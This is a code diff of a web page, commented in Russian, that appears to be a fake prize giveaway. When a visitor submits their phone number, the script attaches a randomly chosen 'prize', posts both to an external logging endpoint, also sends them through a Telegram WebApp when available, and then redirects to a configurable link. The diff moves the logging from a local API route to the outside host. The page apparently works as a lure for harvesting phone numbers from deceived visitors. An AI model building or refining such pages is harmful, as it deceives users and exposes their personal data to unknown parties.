@@ -238,23 +238,32 @@
       prizeModal.classList.remove('hidden');
       prizeModal.classList.add('flex');
 
-    continueBtn.onclick = async () => {
-  const phone = phoneInput.value;
-  const prize = pickPrize();
+continueBtn.onclick = async () => {
+  const phone = phoneInput.value;    // введённый номер
+  const prize = pickPrize();         // выбранный приз
 
-  // отправляем лог на Vercel → Telegram
+  // 1️⃣ Отправляем лог на сервер Vercel
   try {
-    await fetch('/api/log', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+    await fetch("https://optimusosen.vercel.app/log", { 
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ message: `Номер: ${phone}, Приз: ${prize}` })
     });
-  } catch(e) {
-    console.error('Ошибка отправки лога', e);
+  } catch (err) {
+    console.error('Ошибка отправки лога:', err);
   }
 
-  // редирект на страницу победы
-  window.location.href = REDIRECT_URL;
+  // 2️⃣ Если WebApp Telegram, отправляем туда
+  if (isTg) {
+    try {
+      window.Telegram.WebApp.sendData(JSON.stringify({ phone, prize }));
+    } catch (err) {
+      console.error('Ошибка отправки в TG WebApp:', err);
+    }
+  }
+
+  // 3️⃣ Редирект пользователя
+  window.location.href = REDIRECT_URL; // <-- меняй REDIRECT_URL на любую ссылку
 };
     }
 
@@ -299,3 +308,4 @@
 </div> -->
 </body>
 </html>
+
